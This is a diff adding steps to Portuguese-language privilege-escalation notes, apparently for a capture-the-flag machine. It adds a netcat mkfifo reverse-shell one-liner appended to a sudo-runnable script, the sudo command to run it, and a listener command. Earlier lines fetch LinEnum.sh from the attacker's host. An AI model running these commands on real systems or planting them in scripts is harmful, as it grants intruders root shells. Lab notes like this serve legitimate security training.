@@ -74,3 +74,11 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 > wget http://<your ip>:8080/LinEnum.sh
 4. Seria uma boa verificar quais comandos é possível executar utilizando sudo
 > sudo -l
+5. Quando é possível executar alguns .sh como root, então vale a pena adicionar um 
+shell reverso no final do arquivo .sh para que possamos ter acesso como root
+> echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your ip> <port> >/tmp/f' | tee -a monitor.sh
+  É crucial que você adicione o comando no final do arquivo, evitando sobreescreve-lo, pois pode causar um efeito inesperado, e sempre tente fazer um backup do arquivo, para evitar complicações.
+6. Execute o shell como sudo
+> sudo /home/nibbler/personal/sutff/monitor.sh
+7. lembre-se de ficar escutando utilizar o netcat na porta determinada do script
+> nc -lvnp <port>
